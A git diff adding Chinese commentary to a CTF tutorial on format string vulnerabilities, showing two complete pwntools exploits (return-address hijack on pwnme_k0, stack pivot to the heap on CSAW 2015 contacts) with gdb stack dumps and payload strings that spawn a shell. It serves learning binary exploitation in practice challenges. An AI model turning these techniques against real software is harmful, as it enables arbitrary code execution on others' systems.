@@ -262,5 +262,564 @@ p.interactive()
 注意
 
 - 我在获取 puts 函数地址时使用的偏移是 8，这是因为我希望我输出的前 4 个字节就是 puts 函数的地址。其实格式化字符串的首地址的偏移是 7。
+
+  **注解**：结合 payload 来看：``payload = "%8$s" + p32(puts_got)`` ，``%8$S``长度为 0x4 ，偏移为 7；``p32(puts_got)`` 长度为 0x4 ，偏移为 8 ;
+
 - 这里我利用了 pwntools 中的 fmtstr_payload 函数，比较方便获取我们希望得到的结果，有兴趣的可以查看官方文档尝试。比如这里 fmtstr_payload(7, {puts_got: system_addr}) 的意思就是，我的格式化字符串的偏移是 7，我希望在 puts_got 地址处写入 system_addr 地址。默认情况下是按照字节来写的。
 
+## hijack retaddr
+
+### 原理 
+
+很容易理解，我们要利用格式化字符串漏洞来劫持程序的返回地址到我们想要执行的地址。
+
+### 例子 
+
+这里我们以 [三个白帽 - pwnme_k0](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/三个白帽-pwnme_k0) 为例进行分析。
+
+#### 确定保护 
+
+```
+➜  三个白帽-pwnme_k0 git:(master) ✗ checksec pwnme_k0
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+可以看出程序主要开启了 NX 保护以及 Full RELRO 保护。这我们就没有办法修改程序的 got 表了。
+
+#### 分析程序 
+
+简单分析一下，就知道程序似乎主要实现了一个类似账户注册之类的功能，主要有修改查看功能，然后发现在查看功能中发现了格式化字符串漏洞
+
+```c
+int __usercall sub_400B07@<eax>(char format@<dil>, char formata, __int64 a3, char a4)
+{
+  write(0, "Welc0me to sangebaimao!\n", 0x1AuLL);
+  printf(&formata, "Welc0me to sangebaimao!\n");
+  return printf(&a4 + 4);
+}
+```
+
+其输出的内容为 &a4 + 4。我们回溯一下，发现我们读入的 password 内容也是
+
+```c
+v6 = read(0, (char *)&a4 + 4, 0x14uLL);
+```
+
+当然我们还可以发现我们读入的 username 在距离的 password 20 个字节。
+
+```c
+puts("Input your username(max lenth:20): ");
+fflush(stdout);
+v8 = read(0, &bufa, 0x14uLL);
+if ( v8 && v8 <= 0x14u )
+{
+    puts("Input your password(max lenth:20): ");
+    fflush(stdout);
+    v6 = read(0, (char *)&a4 + 4, 0x14uLL);
+    fflush(stdout);
+    *(_QWORD *)buf = bufa;
+    *(_QWORD *)(buf + 8) = a3;
+    *(_QWORD *)(buf + 16) = a4;
+```
+
+好，这就差不多了。此外，也可以发现这个账号密码其实没啥配对不配对的。
+
+#### 利用思路 
+
+我们最终的目的是希望可以获得系统的 shell，可以发现在给定的文件中，在 0x00000000004008A6 地址处有一个直接调用 system('bin/sh') 的函数（关于这个的发现，一般都会现在程序大致看一下。）。那如果我们修改某个函数的返回地址为这个地址，那就相当于获得了 shell。
+
+虽然存储返回地址的内存本身是动态变化的，但是其相对于 rbp 的地址并不会改变，所以我们可以使用相对地址来计算。
+
+**注解**：
+
+上面这句话可以这样理解：有一个独立函数 A 的栈帧，这个 A 栈帧整体存放地址是动态变化的。但是 A 栈帧内部的结构是固定的，举个例子：rbp 一定在 rip 前面（低地址）。还有我们知道的是 rbp 存储的是上一个栈帧的 rbp 地址，如果说每次都是通过函数 B 调用函数 A ，因为AB 栈帧长度&结构固定，我们就可以通过泄露函数 A rbp 的值减去偏移得到函数 A rip 地址。
+
+![fmrstr_3.png](img\fmrstr_3.png)
+
+利用思路如下
+
+- 确定偏移
+- 获取函数的 rbp 与返回地址
+- 根据相对偏移获取存储返回地址的地址
+- 将执行 system 函数调用的地址写入到存储返回地址的地址。
+
+#### 确定偏移 
+
+首先，我们先来确定一下偏移。输入用户名 aaaaaaaa，密码随便输入，断点下在输出密码的那个 printf(&a4 + 4) 函数处
+
+```shell
+Register Account first!
+Input your username(max lenth:20): 
+aaaaaaaa
+Input your password(max lenth:20): 
+%p%p%p%p%p%p%p%p%p%p
+Register Success!!
+1.Sh0w Account Infomation!
+2.Ed1t Account Inf0mation!
+3.QUit sangebaimao:(
+>error options
+1.Sh0w Account Infomation!
+2.Ed1t Account Inf0mation!
+3.QUit sangebaimao:(
+>1
+...
+```
+
+此时栈的情况为
+
+```shell
+─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
+     0x400b1a                  call   0x400758
+     0x400b1f                  lea    rdi, [rbp+0x10]
+     0x400b23                  mov    eax, 0x0
+ →   0x400b28                  call   0x400770
+   ↳    0x400770                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc0
+        0x400776                  xchg   ax, ax
+        0x400778                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc8
+        0x40077e                  xchg   ax, ax
+────────────────────────────────────────────────────────────────────[ stack ]────
+0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15     ← $rsp, $rbp
+0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30
+0x00007fffffffdb50│+0x10: "aaaaaaaa"     ← $rdi
+0x00007fffffffdb58│+0x18: 0x000000000000000a
+0x00007fffffffdb60│+0x20: 0x7025702500000000
+0x00007fffffffdb68│+0x28: "%p%p%p%p%p%p%p%pM\r@"
+0x00007fffffffdb70│+0x30: "%p%p%p%pM\r@"
+0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
+```
+
+可以发现我们输入的用户名在栈上第三个位置，那么除去本身格式化字符串的位置，其偏移为为 5 + 3 = 8。
+
+**注解**：
+
+这里我还是用我习惯的方法，输出几个 %p 直接数出来偏移。
+
+#### 修改地址 
+
+我们再仔细观察下断点（b printf）处栈的信息
+
+```sehll
+0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15     ← $rsp, $rbp
+0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30
+0x00007fffffffdb50│+0x10: "aaaaaaaa"     ← $rdi
+0x00007fffffffdb58│+0x18: 0x000000000000000a
+0x00007fffffffdb60│+0x20: 0x7025702500000000
+0x00007fffffffdb68│+0x28: "%p%p%p%p%p%p%p%pM\r@"
+0x00007fffffffdb70│+0x30: "%p%p%p%pM\r@"
+0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
+```
+
+可以看到栈上第二个位置存储的就是该函数的返回地址 (其实也就是调用 show account 函数时执行 push rip 所存储的值)，在格式化字符串中的偏移为 7。
+
+与此同时栈上，第一个元素存储的也就是上一个函数的 rbp。所以我们可以得到偏移 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38。继而如果我们知道了 rbp 的数值，就知道了函数返回地址的地址。
+
+![fmrstr_3.png](img\fmrstr_3.png)
+
+0x0000000000400d74 与 0x00000000004008A6 只有低 2 字节不同，所以我们可以只修改 0x00007fffffffdb48 开始的 2 个字节。
+
+这里需要说明的是**在某些较新的系统 (如 ubuntu 18.04) 上, 直接修改返回地址为 0x00000000004008A6 时可能会发生程序 crash**, 这时可以考虑修改返回地址为 0x00000000004008AA, 即直接调用 system("/bin/sh") 处
+
+```shell
+.text:00000000004008A6 sub_4008A6      proc near
+.text:00000000004008A6 ; __unwind {
+.text:00000000004008A6                 push    rbp
+.text:00000000004008A7                 mov     rbp, rsp
+.text:00000000004008AA <- here         mov     edi, offset command ; "/bin/sh"
+.text:00000000004008AF                 call    system
+.text:00000000004008B4                 pop     rdi
+.text:00000000004008B5                 pop     rsi
+.text:00000000004008B6                 pop     rdx
+.text:00000000004008B7                 retn
+```
+
+#### 利用程序 
+
+```python
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# @Author  : MrSkYe
+# @Email   : skye231@foxmail.com
+# @File    : pwnme_k0.py
+from pwn import *
+context.log_level = 'debug'
+
+p = process("./pwnme_k0")
+elf = ELF("./pwnme_k0")
+
+# leak stack addr
+payload = 'a'*0x8 + "%6$p"
+
+p.recvuntil("20): \n")
+p.send(payload)
+p.recvuntil("20): \n")
+p.send(payload)
+
+p.recvuntil('>')
+#gdb.attach(p,'b printf')
+p.sendline('1')
+p.recvuntil('a'*0x8)
+stack_leak = int(p.recv(14),16) - 0x38
+log.info("stack_leak:"+hex(stack_leak))
+
+# hijack retaddr
+payload1 = p64(stack_leak)
+payload2 = "%2218d%8$hn"
+
+p.recvuntil('>')
+p.sendline('2')
+p.recvuntil("20): \n")
+p.sendline(payload1)
+p.recvuntil("20): \n")
+p.sendline(payload2)
+
+p.recvuntil('>')
+p.sendline('1')
+
+p.interactive()
+```
+
+**注解**：
+
+1. 泄露地址的时候使用格式化字符串用的是 %p ，如果用 %s 再 u64 泄露出来的是函数 B 的 rbp 的值。原因也很简单，要求输出的是字符，系统到函数 A rbp 的值指向的地址取值，也就是函数 B 的值。如果是 %p 就将函数 A rbp 的值输出。
+2. hijack 部分的 payload ，格式化字符串可以放到 name 输入，也就是和 stack_leak 一起输入，password 就随便输入点东西行了。这里因为输入长度现在，所以没有使用最稳妥的 单字节 输入，而是双字节。
+
+## 堆上的格式化字符串漏洞
+
+### 原理 
+
+所谓堆上的格式化字符串指的是格式化字符串本身存储在堆上，这个主要增加了我们获取对应偏移的难度，而一般来说，该格式化字符串都是很有可能被复制到栈上的。（出现情况就像下面例子，格式化字符串本身存储在堆上，字符指针指向栈上，出现的情况是我们不能容易控制写入的地址）
+
+### 例子 
+
+这里我们以 2015 年 CSAW 中的 [contacts](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts) 为例进行介绍。
+
+#### 确定保护 
+
+```shell
+➜  2015-CSAW-contacts git:(master) ✗ checksec contacts
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+可以看出程序不仅开启了 NX 保护还开启了 Canary。（RELRO 半保护，我们是不是能 hijack got 表呢？hijack retaddr 呢？）
+
+#### 分析程序 
+
+简单看看程序，发现程序正如名字所描述的，是一个联系人相关的程序，可以实现创建，修改，删除，打印联系人的信息。而再仔细阅读，可以发现在打印联系人信息的时候存在格式化字符串漏洞。
+
+```c
+int __cdecl PrintInfo(int a1, int a2, int a3, char *format)
+{
+  printf("\tName: %s\n", a1);
+  printf("\tLength %u\n", a2);
+  printf("\tPhone #: %s\n", a3);
+  printf("\tDescription: ");
+  return printf(format);	//格式化字符串漏洞
+}
+```
+
+仔细看看，可以发现这个 format 其实是指向堆中的。
+
+**注解**：可以从调用 PrintInfo 的上层函数查看最后一个参数：（v2 是结构体链表）
+
+```c
+sub_8048BD1(v2 + 8, *(_DWORD *)(v2 + 72), *(_DWORD *)(v2 + 4), *(char **)v2);
+```
+
+#### 利用思路 
+
+我们的基本目的是获取系统的 shell，从而拿到 flag。其实既然有格式化字符串漏洞，我们应该是可以通过劫持 got 表或者控制程序返回地址来控制程序流程。但是这里却不怎么可行。原因分别如下
+
+- 之所以不能够劫持 got 来控制程序流程，是因为我们发现对于程序中常见的可以对于我们给定的字符串输出的只有 printf 函数，我们只有选择它才可以构造 /bin/sh 让它执行 system('/bin/sh')，但是 printf 函数在其他地方也均有用到，这样做会使得程序直接崩溃。
+
+  **注解**
+
+  换句人话就是：在这个程序中，我们能控制输入参数的函数就只有 printf ，诸如 puts 等的参数都是我们不可控的。因为修改 got 表之后我们需要传入 binsh 的地址，所以只能选择 printf 。但是选择 printf 又有一个问题，我们修改完后，printf 各个地方都会用到，还没运行到我们能输入参数的地方，程序就已经挂逼了。
+
+  这里还有一个原因 wiki 中没有提及，那就是我们不能直接控制写入地址。原因很简单：通过分析程序知道，格式化字符串是存放在堆上，而字符串指针是在栈上，很明显的现象就是栈上不是字符串的明文，而是字符串的堆地址，就算我们在格式化字符串中输入目标地址，也不能通过偏移获取。（这个程序全部可控输入都放在堆上）我们不能直接控制输入目标地址，找栈上现有的地址。
+
+  超长偏移能取到值？我们当它是可行的试一试，格式化字符串到描述堆块相差 ``-0xf7fafed0`` ，偏移为 ``-1040105396`` ，构造尝试一下：
+
+  ![fmrstr_4.png](img\fmrstr_4.png)
+
+  
+
+- 其次，不能够直接控制程序返回地址来控制程序流程的是因为我们并没有一块可以直接执行的地址来存储我们的内容，同时利用格式化字符串来往栈上直接写入 system_addr + 'bbbb' + addr of '/bin/sh‘ 似乎并不现实。
+
+  **注解**：
+
+  换句人话就是：我们不能直接控制目标地址，只能在栈上通过偏移找地址，而栈上没有指向 eip 的地方，也就找不到 eip 地址，就不能修改 eip 的值。
+
+**注解**：
+
+就因为我们不能直接控制目标地址，所以不能用 hijack GOT 、hijack retaddr 。
+
+那么我们可以怎么做呢？我们还有之前在栈溢出讲的技巧，stack pivoting。而这里，我们可以控制的恰好是堆内存，所以我们可以把栈迁移到堆上去。这里我们通过 leave 指令来进行栈迁移，所以在迁移之前我们需要修改程序保存 ebp 的值为我们想要的值。 只有这样在执行 leave 指令的时候， esp 才会成为我们想要的值。（leave 指令等于：``mov esp,ebp;pop ebp;``）
+
+同时，因为我们是使用格式化字符串来进行修改，所以我们得知道保存 ebp 的地址为多少，而这时 PrintInfo 函数中存储 ebp 的地址每次都在变化，而我们也无法通过其他方法得知。但是，**程序中压入栈中的 ebp 值其实保存的是上一个函数的保存 ebp 值的地址**，所以我们可以修改其**上层函数的保存的 ebp 的值，即上上层函数（即 main 函数）的 ebp 数值**。这样当上层程序返回时，即实现了将栈迁移到堆的操作。
+
+基本思路如下
+
+- 首先获取 system 函数的地址
+
+  - 通过泄露某个 libc 函数的地址根据 libc database 确定。
+
+- 构造基本联系人描述为 system_addr + 'bbbb' + binsh_addr
+
+- 修改上层函数保存的 ebp(即上上层函数的 ebp) 为**存储 system_addr 的地址 -4**。
+
+  **注解**：
+
+  为什是**system_addr 的地址 -4** ？是因为程序末尾的 ``leave;ret`` 执行完 ``leave`` 后，esp 是指向 ebp 的，然后 esp 的值会增加一个机器长度（这时 esp 刚好是指向 eip ），再执行 ret 将 esp 指向的值压入 eip 中。
+
+- 当主程序返回时，会有如下操作（第一第二合并等于 ``leave`` ）
+
+  - move esp,ebp，将 esp 指向 system_addr 的地址 - 4
+  - pop ebp， 将 esp 指向 system_addr
+  - ret，将 eip 指向 system_addr，从而获取 shell。
+
+#### 获取相关地址与偏移 
+
+这里我们主要是获取 system 函数地址、/bin/sh 地址，栈上存储联系人描述的地址，以及 PrintInfo 函数的地址。
+
+首先，我们根据栈上存储的 libc_start_main_ret 地址 (该地址是当 main 函数执行返回时会运行的函数) 来获取 system 函数地址、/bin/sh 地址。我们构造相应的联系人，然后选择输出联系人信息，并将断点下在 printf 处，并且一直运行到格式化字符串漏洞的 printf 函数处，如下
+
+```shell
+ → 0xf7e44670 <printf+0>       call   0xf7f1ab09 <__x86.get_pc_thunk.ax>
+   ↳  0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret    
+───────────────────────────────────────────────────────────────────────────────────────[ stack ]────
+['0xffffccfc', 'l8']
+8
+0xffffccfc│+0x00: 0x08048c27  →   leave      ← $esp
+0xffffcd00│+0x04: 0x0804c420  →  "1234567"
+0xffffcd04│+0x08: 0x0804c410  →  "11111"
+0xffffcd08│+0x0c: 0xf7e5acab  →  <puts+11> add ebx, 0x152355
+0xffffcd0c│+0x10: 0x00000000
+0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0
+0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0
+0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000   ← $ebp
+──────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
+[#0] 0xf7e44670 → Name: __printf(format=0x804c420 "1234567\n")
+[#1] 0x8048c27 → leave 
+[#2] 0x8048c99 → add DWORD PTR [ebp-0xc], 0x1
+[#3] 0x80487a2 → jmp 0x80487b3
+[#4] 0xf7e13637 → Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 <_dl_fini>, stack_end=0xffffce0c)
+[#5] 0x80485e1 → hlt 
+────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  dereference $esp 140
+['$esp', '140']
+1
+0xffffccfc│+0x00: 0x08048c27  →   leave      ← $esp
+gef➤  dereference $esp l140
+['$esp', 'l140']
+140
+0xffffccfc│+0x00: 0x08048c27  →   leave      ← $esp
+0xffffcd00│+0x04: 0x0804c420  →  "1234567"
+0xffffcd04│+0x08: 0x0804c410  →  "11111"
+0xffffcd08│+0x0c: 0xf7e5acab  →  <puts+11> add ebx, 0x152355
+0xffffcd0c│+0x10: 0x00000000
+0xffffcd10│+0x14: 0xf7fad000  →  0x001b1db0
+0xffffcd14│+0x18: 0xf7fad000  →  0x001b1db0
+0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000   ← $ebp
+0xffffcd1c│+0x20: 0x08048c99  →   add DWORD PTR [ebp-0xc], 0x1
+0xffffcd20│+0x24: 0x0804b0a8  →  "11111"
+0xffffcd24│+0x28: 0x00002b67 ("g+"?)
+0xffffcd28│+0x2c: 0x0804c410  →  "11111"
+0xffffcd2c│+0x30: 0x0804c420  →  "1234567"
+0xffffcd30│+0x34: 0xf7fadd60  →  0xfbad2887
+0xffffcd34│+0x38: 0x08048ed6  →  0x25007325 ("%s"?)
+0xffffcd38│+0x3c: 0x0804b0a0  →  0x0804c420  →  "1234567"
+0xffffcd3c│+0x40: 0x00000000
+0xffffcd40│+0x44: 0xf7fad000  →  0x001b1db0
+0xffffcd44│+0x48: 0x00000000
+0xffffcd48│+0x4c: 0xffffcd78  →  0x00000000
+0xffffcd4c│+0x50: 0x080487a2  →   jmp 0x80487b3
+0xffffcd50│+0x54: 0x0804b0a0  →  0x0804c420  →  "1234567"
+0xffffcd54│+0x58: 0xffffcd68  →  0x00000004
+0xffffcd58│+0x5c: 0x00000050 ("P"?)
+0xffffcd5c│+0x60: 0x00000000
+0xffffcd60│+0x64: 0xf7fad3dc  →  0xf7fae1e0  →  0x00000000
+0xffffcd64│+0x68: 0x08048288  →  0x00000082
+0xffffcd68│+0x6c: 0x00000004
+0xffffcd6c│+0x70: 0x0000000a
+0xffffcd70│+0x74: 0xf7fad000  →  0x001b1db0
+0xffffcd74│+0x78: 0xf7fad000  →  0x001b1db0
+0xffffcd78│+0x7c: 0x00000000
+0xffffcd7c│+0x80: 0xf7e13637  →  <__libc_start_main+247> add esp, 0x10
+0xffffcd80│+0x84: 0x00000001
+0xffffcd84│+0x88: 0xffffce14  →  0xffffd00d  →  "/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]"
+0xffffcd88│+0x8c: 0xffffce1c  →  0xffffd058  →  "XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]"
+```
+
+我们可以通过简单的判断可以得到
+
+```shell
+0xffffcd7c│+0x80: 0xf7e13637  →  <__libc_start_main+247> add esp, 0x10
+```
+
+存储的是 __libc_start_main 的返回地址，同时利用 fmtarg 来获取对应的偏移，可以看出其偏移为 32，那么相对于格式化字符串的偏移为 31（格式化字符串在 0xffffcd00 ）。
+
+```shell
+gef➤  fmtarg 0xffffcd7c
+The index of format argument : 32
+```
+
+这样我们便可以得到对应的地址了。进而可以根据 libc-database 来获取对应的 libc，继而获取 system 函数地址与 /bin/sh 函数地址了。
+
+其次，我们可以确定栈上存储格式化字符串的地址 0xffffcd2c 相对于格式化字符串的偏移为 11，得到这个是为了寻址堆中指定联系人的 Description 的内存首地址，我们将格式化字符串 [system_addr\]\[bbbb]\[binsh_addr]\[%6p][p]\[p][bbbb] 保存在指定联系人的 Description 中。
+
+再者，我们可以看出下面的地址保存着上层函数的调用地址，其相对于格式化字符串的偏移为 6，这样我们可以直接修改上层函数存储的 ebp 的值。
+
+```shell
+0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000   ← $ebp
+```
+
+#### 构造联系人获取堆地址 
+
+得知上面的信息后，我们可以利用下面的方式获取堆地址与相应的 ebp 地址。
+
+```shell
+[system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb]
+```
+
+来获取对应的相应的地址。后面的 bbbb 是为了接受字符串方便。
+
+这里因为函数调用时所申请的栈空间与释放的空间是一致的，所以我们得到的 ebp 地址并不会因为我们再次调用而改变。
+
+**注解**：
+
+因为 PrintInfo 肯定是通过 main 函数调用的，而 main 函数一直没有结束，也就是一直在内存的某一固定位置。PrintInfo 是在 main 栈基础上往低地址生长的，所以只有 PrintInfo 结构固定 ebp 地址也不会因为我们再次调用而改变。PrintInfo 结构固定是因为所有输出内容（号码、描述等）都是以堆堆指针形式存储的，也就是无论长度如何变化在栈上所在空间都是不变的，ebp 的偏移也就是固定了。
+
+在部分环境下，system 地址会出现 \ x00，导致 printf 的时候出现 0 截断导致无法泄露两个地址，因此可以将 payload 的修改如下：
+
+```shell
+[%6$p][%11$p][ccc][system_addr][bbbb][binsh_addr][dddd]
+```
+
+payload 修改为这样的话，还需要在 heap 上加入 12 的偏移。这样保证了 0 截断出现在泄露之后。``[%6$p]``：上层函数 ebp 地址；``[%11$p]``：堆块 fd 指针地址；
+
+#### 修改 ebp
+
+由于我们需要执行 leave（ ~~move 指令将 ebp 赋给 esp，并还需要执行 pop ebp~~ ）才会执行 ret 指令，所以我们需要将 ebp 修改为存储 system 地址 -4 的值。这样 ``move esp,ebp`` 之后，esp 恰好指向保存 system 的地址，这时在执行 ret 指令即可执行 system 函数。
+
+上面已经得知了我们希望修改的 ebp 值，而也知道了对应的偏移为 6，所以我们可以构造如下的 payload 来进行修改相应的值。(这里是 wiki 的修改方法，因为wiki exp 我本地打不通，换成自己的，所以修改方法也不一样)
+
+```python
+part1 = (heap_addr - 4) / 2
+part2 = heap_addr - 4 - part1
+payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
+```
+
+#### 获取 shell
+
+这时，执行完格式化字符串函数之后，退出到上上函数，我们输入 5 ，退出程序即会执行 ret 指令，就可以获取 shell。
+
+#### 利用程序 
+
+```python
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# @Author  : MrSkYe
+# @Email   : skye231@foxmail.com
+# @File    : contacts.py
+from pwn import *
+context.log_level = 'debug'
+
+p = process("./contacts")
+elf = ELF("./contacts")
+#libc = ELF("/lib/i386-linux-gnu/libc.so.6")
+# 使用题目提供的libc
+libc = ELF("./libc.so")
+
+def creat(name,number,length,description):
+	p.sendlineafter(">>> ",'1')
+	p.sendlineafter("Name: ",name)
+	p.sendlineafter("No: ",number)
+	p.sendlineafter("description: ",str(length))
+	p.sendlineafter("description:\n",description)
+
+def free(name):
+	p.sendlineafter(">>> ",'2')
+	p.sendlineafter("remove? ",name)
+
+def edit(name,choose,newname='skye',length=10,description='skye'):
+	p.sendlineafter(">>> ",'3')
+	p.sendlineafter("change? ",name)
+	p.sendlineafter(">>> ",str(choose))
+	if(choose==1):
+		p.sendlineafter("name: ",newname)
+	elif(choose==2):
+		p.sendlineafter("description: ",str(length))
+		p.sendlineafter("Description: \n",description)
+
+def show():
+	p.sendlineafter(">>> ",'4')
+
+    
+# leak libc
+creat("skye","skye",24,'a'*4+"%31$p")
+show()
+p.recvuntil('a'*4)
+
+libc_start_main = int(p.recv(10),16)
+log.info("libc_start_main:"+hex(libc_start_main))
+libc_base = libc_start_main - 0x18637
+log.info("libc_base:"+hex(libc_base))
+system_addr = libc_base + libc.symbols['system']
+log.info("system_addr:"+hex(system_addr))
+binsh_addr = libc_base + libc.search('sh\x00').next()
+log.info("binsh_addr:"+hex(binsh_addr))
+
+
+# leak ebp&heap addr
+# 将system前置可能会遇到\x00阻断，可自行后置，并调整ebp覆盖值
+payload = p32(system_addr) + 'bbbb' + p32(binsh_addr) + '%6$p%11$pcccc'
+creat('2222', 'skye', 0x20, payload)
+show()
+p.recvuntil('Description: ')
+data = p.recvuntil('cccc', drop=True)
+data = data.split('0x')
+ebp_addr = int(data[-2], 16)
+log.info("ebp_addr:"+hex(ebp_addr))
+heap_addr = int(data[-1], 16)
+log.info("heap_addr:"+hex(heap_addr))
+
+
+# overwrite main_ebp
+payload = '%{}c%6$n'.format(str(heap_addr-4))
+creat('3333', 'skye', 68, payload)
+#gdb.attach(p,'b *0x0804876A')
+#raw_input('pause')
+show()
+
+
+#getshell
+p.recvuntil('>>> ')
+p.sendline('5')
+
+p.interactive()
+```
+
+需要注意的是，这样并不能稳定得到 shell，因为我们一次性输入了太长的字符串。但是我们又没有办法在前面控制所想要输入的地址。只能这样了。
+
+为什么需要打印这么多呢？因为格式化字符串不在栈上，所以就算我们得到了需要更改的 ebp 的地址，也没有办法去把这个地址写到栈上，利用 $ 符号去定位他；因为没有办法定位，所以没有办法用 hn\hhn 等方式去写这个地址，只能用 n 方式去写，所以打印很多。
+
+**注解**：
+
+我的脚本中用的不是 ``system('/bin/sh')`` ，而是 ``system('sh')`` ，这是因为用题目提供的 libc 搜索 /bin/sh 得到结果有误，得到的地址不是 /bin/sh ：
+
+![fmrstr_5.png](img/fmrstr_5.png)
+
+而去到 libcdatabase 得到结果是：``0xf7f60a0b``，里面有一个 0x0a 就是换行符嘛，这样会提前终止输入，所以也不行。最后使用题目提供 libc 搜索 sh ，成功 getshell 。
+
+在我的环境（Ubuntu 16.04）没有遇到 system \x00 阻断，所以 payload 中 system 前置，如果遇到阻断，就将 system 后置，并调整 ebp 覆盖内容加上偏移即可。
